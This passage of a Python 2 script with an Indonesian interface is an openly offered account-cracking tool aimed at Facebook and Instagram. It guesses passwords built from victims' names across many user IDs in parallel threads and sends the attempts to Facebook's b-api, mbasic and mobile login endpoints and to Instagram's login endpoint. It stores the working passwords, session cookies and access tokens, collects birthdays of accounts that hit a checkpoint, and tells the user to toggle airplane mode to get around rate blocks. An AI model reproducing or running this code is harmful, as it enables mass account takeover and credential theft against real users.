                            print '%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(M,P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s ╚%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(M,P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('2', '02'):
                            print '%s ╠────────────────────────────────────────────────────► \n ║ %s𝙲𝚛𝚊𝚌𝚔 𝙱𝚎𝚛𝚓𝚊𝚕𝚊𝚗 ( %s𝙸𝙳﹡𝚂𝙰𝙽𝙳𝙸﹡𝚃𝚃𝙻%s ) 𝚃𝚎𝚔𝚊𝚗 𝙲𝚃𝚁𝙻 + 𝚉 𝚞𝚗𝚝𝚞𝚔 𝚂𝚝𝚘𝚙%s  \n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(M,P,H,P,M,P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(M,P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s ╚%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(M,P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            print '%s ╠────────────────────────────────────────────────────► \n ║ %s𝙲𝚛𝚊𝚌𝚔 𝙱𝚎𝚛𝚓𝚊𝚕𝚊𝚗 ( %s𝙸𝙳﹡𝚂𝙰𝙽𝙳𝙸﹡𝚃𝚃𝙻%s ) 𝚃𝚎𝚔𝚊𝚗 𝙲𝚃𝚁𝙻 + 𝚉 𝚞𝚗𝚝𝚞𝚔 𝚂𝚝𝚘𝚙%s  \n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(M,P,H,P,M,P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(M,P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s ╚%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(M,P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print ('%s ║\n ╠%s[𔙃] Salah sayang'%(M,M));zona()
                    print '%s ║\n ╠─%s༈།༴༷༅ 𝐑𝐌𝐀࿐ཽ༵  ︻ཬ̸̵̵ྃ‾̶͞‾̶͞‾̶͞‾̶͞‾̶͞‾̶̶͞͞ཬྃ‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿‾̿‾̿‾̿‾̿‾̿‾̿‾̿‾̅‾‎‾‎‾‾'%(M,P)
                    print '%s ╠──────────────────────────────────────────► \n ║%s 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚝𝚑𝚘𝚍𝚎 𝙲𝚛𝚊𝚌𝚔'%(M,P) 
                    print '%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 1. methode b-api (crack cepat)'%(M,P,K,P)
                    print '%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 2. methode mbasic (crack lambat)'%(M,P,K,P)
                    print ' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 3. methode mobile (crack sangat lambat) '%(M,P,K,P)
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print '%s ║\n ╠─ %s༈།༴༷༅ 𝐑𝐌𝐀࿐ཽ༵  ︻ཬ̸̵̵ྃ‾̶͞‾̶͞‾̶͞‾̶͞‾̶͞‾̶̶͞͞ཬྃ‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿͞‾̿‾̿‾̿‾̿‾̿‾̿‾̿‾̿‾̅‾‎‾‎‾‾'%(M,P)
            print '%s ╠──────────────────────────────────────────► \n ║%s 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚝𝚑𝚘𝚍𝚎 𝙲𝚛𝚊𝚌𝚔'%(M,P)
            print ' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 1. methode b-api (crack cepat)'%(M,P,K,P)
            print ' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 2. methode mbasic (crack lambat)'%(M,P,K,P)
            print ' %s╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 3. methode mobile (crack sangat lambat) '%(M,P, K,P)
            self.langsung()
        else:
            print("%s ╚[𔙃] Salah sayang "%(M));jeda(2);menu()
    def langsung(self):
        suuu = raw_input('%s ║\n ╠%s[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] methode :%s '%(M,P,K))
        if suuu == '':
            print("%s ╚[𔙃] Salah sayang "%(M));self.langsung()
        elif suuu in ('1', '01'):
            print '%s ╠────────────────────────────────────────────────────► \n ║ %s𝙲𝚛𝚊𝚌𝚔 𝙱𝚎𝚛𝚓𝚊𝚕𝚊𝚗 ( %s𝙸𝙳﹡𝚂𝙰𝙽𝙳𝙸﹡𝚃𝚃𝙻%s ) 𝚃𝚎𝚔𝚊𝚗 𝙲𝚃𝚁𝙻 + 𝚉 𝚞𝚗𝚝𝚞𝚔 𝚂𝚝𝚘𝚙 %s \n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(M,P,H,P,M,P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(M,P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s ╚%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(M,P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('2', '02'):
            print ' %s ╠────────────────────────────────────────────────────► \n ║ %s𝙲𝚛𝚊𝚌𝚔 𝙱𝚎𝚛𝚓𝚊𝚕𝚊𝚗 ( %s𝙸𝙳﹡𝚂𝙰𝙽𝙳𝙸﹡𝚃𝚃𝙻%s ) 𝚃𝚎𝚔𝚊𝚗 𝙲𝚃𝚁𝙻 + 𝚉 𝚞𝚗𝚝𝚞𝚔 𝚂𝚝𝚘𝚙 %s \n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(M,P,H,P,M,P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(M,P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s ╚%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(M,P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('3', '03'):
            print '%s ╠────────────────────────────────────────────────────► \n ║ %s𝙲𝚛𝚊𝚌𝚔 𝙱𝚎𝚛𝚓𝚊𝚕𝚊𝚗 ( %s𝙸𝙳﹡𝚂𝙰𝙽𝙳𝙸﹡𝚃𝚃𝙻%s ) 𝚃𝚎𝚔𝚊𝚗 𝙲𝚃𝚁𝙻 + 𝚉 𝚞𝚗𝚝𝚞𝚔 𝚂𝚝𝚘𝚙 %s \n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(M,P,H,P,M,P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(M,P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s ╚%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(M,P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        else:
            print("%s║\n ╚[𔙃] Salah sayang "%(M));self.langsung()
    def b_api(self, user, zona):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/FBIOS;FBAV/210.0.0.37.117;FBBV/143754374;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/3;FBCR/AT&T;FBID/phone;FBLC/en_US;FBOP/5;FBRV/146819970]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	loop +=1
            	print ("\r\033[0;91m [™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %sᡁ───╼ %s ﹡ %s ﹡ %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s ﹡ %s ﹡ %s' % (user,pw,response.json()['access_token']))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' ᡁ───╼ %s ﹡ %s ﹡ %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %sᡁ───╼ %s ﹡ %s ﹡ %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s ﹡ %s ﹡ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" ᡁ───╼ %s ﹡ %s ﹡ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %sᡁ───╼ %s ﹡ %s           ' % (K,user,pw)
                cp.append('%s ﹡ %s' % (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" ᡁ───╼ %s ﹡ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %sᡁ───╼﹡ %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def basic(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/FBIOS;FBAV/210.0.0.37.117;FBBV/143754374;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/3;FBCR/AT&T;FBID/phone;FBLC/en_US;FBOP/5;FBRV/146819970]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %sᡁ───╼ %s ﹡ %s ﹡ %s  ' % (H,user,pw,kuki)
                ok.append("%s ﹡ %s ﹡ %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" ᡁ───╼ %s ﹡ %s ﹡ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %sᡁ───╼ %s ﹡ %s ﹡ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ﹡ %s ﹡ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" ᡁ───╼ %s ﹡ %s ﹡ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %sᡁ───╼ %s ﹡ %s            ' % (K,user,pw)
                cp.append("%s ﹡ %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" ᡁ───╼ %s ﹡ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %sᡁ───╼ %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def mobil(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/FBIOS;FBAV/210.0.0.37.117;FBBV/143754374;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/3;FBCR/AT&T;FBID/phone;FBLC/en_US;FBOP/5;FBRV/146819970]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %sᡁ───╼ %s ﹡ %s ﹡ %s ' % (H,user,pw,kuki)
                ok.append("%s ﹡ %s ﹡ %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" ᡁ───╼ %s ﹡ %s ﹡ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %sᡁ───╼ %s ﹡ %s ﹡ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ﹡ %s ﹡ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" ᡁ───╼ %s ﹡ %s ﹡ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %sᡁ───╼ %s ﹡ %s              ' % (K,user,pw)
                cp.append("%s ﹡ %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" ᡁ───╼ %s ﹡ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %sᡁ───╼ %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
def crack2(user, pwx):
	global looping, loping
	c_bff_ = len(pwx)
	for pas in pwx:
		if looping != 1:
			pass
		else:
			if len(status_foll) != 1:
				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
				print "\r "+rm+"ᡁ───╼ %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
				sys.stdout.flush()
				c_bff_ -= 1
			else:
				pass
		try:
			if user in ok or user in cp:
				break
			pw = pas.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as ses:
					urll = "https://www.instagram.com/"
					data = ses.get(urll, headers=headerz).content
					tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
						 }
				param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
						}
			except:
				header = {}
				param = {}
				pass
			with requests.Session() as ses:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses.post(url, data=param, headers=header)
				data = json.loads(respon.content);jeda(00.1)
				# print ("\r",data)
				# print ("\r *--> %s,%s,|,%s,%s            "%(P,user,H,pw))
				if "checkpoint_url" in str(data):
					cepeh = "Checkpoint"
					ingfo(user, pw, cepeh)
					with open("cepeh.txt", "a") as simpan:
						simpan.write(" [Checkpoint] "+user+" ﹡ "+pw+"\n")
					cp.append(user)
					break
				elif "userId" in str(data):
					okeh = "Berhasil"
					if len(status_foll) != 1:
						ingfo(user, pw, okeh)
						with open("okeh.txt", "a")as simpan:
							simpan.write(" [Berhasil] "+user+" ﹡ "+pw+"\n")
						ok.append(user)
						#follow(ses,user)
					break
				elif "Please wait" in str(data):
					print ("\r%s ╚[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Mode pesawatkan 2 detik  "%(M)),
					looping+=1
					sys.stdout.flush()
					pwx = [pw]
					crack2(user, pwx)
					loping -= 1
				else:
					looping = 1
					pass
		except requests.exceptions.ConnectionError:
			print ("\r%s ╚[™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] Tidak ada koneksi Internet "%(M)),
			sys.stdout.flush()
			looping+=1
			pwx = [pw]
			crack2(user, pwx)
			loping -= 1
		except:
			looping = 1
			pass
	loping+=1
None
# GANTI USER AGENT
def useragent():
	print ("%s ║ \n ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 1. Ganti user agent "%(M,P,K,P))
	print ("%s ╠%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 2. Cek user agent "%(M,P,K,P))
	print (" %s╚%s[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] 0. Kembali "%(M,P,M,P))
	uas()
def uas():
    u = raw_input('\n%s [⸙] pilih :%s '%(P,K))
    if u == '':
        print("%s [𔙃] Salah sayang "%(M));jeda(2);uas()
    elif u in("1","01"):
    	print (" %s╔[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
    	print (" ╚[%s™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼%s] ketik %sdefault%s untuk gunakan user agent bawaan tools"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s [⸙] user agent : %s"%(P,K))
            if ua in(""):
            	print("%s [𔙃] Salah sayang "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s [™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼]  Anda akan di arahkan ke browser "%(H));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
                ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/FBIOS;FBAV/210.0.0.37.117;FBBV/143754374;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/3;FBCR/AT&T;FBID/phone;FBLC/en_US;FBOP/5;FBRV/146819970]'
                open("data/ua.txt","w").write(ua_)
                print ("\n%s [™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] menggunakan user agent bawaan"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s [™✓▄╥᳢⃥⃪᷵⃩⃑-▰⃥⃪᪴ᷓ᷇᷄̇⃐⃩⃜⃛ᡁ───╼] berhasil mengganti user agent"%(H));jeda(2);menu()
        except KeyboardInterrupt as er:
			exit ("\x1b[1;91m [!] "+er) 
    elif u in("2","02"):
        try:
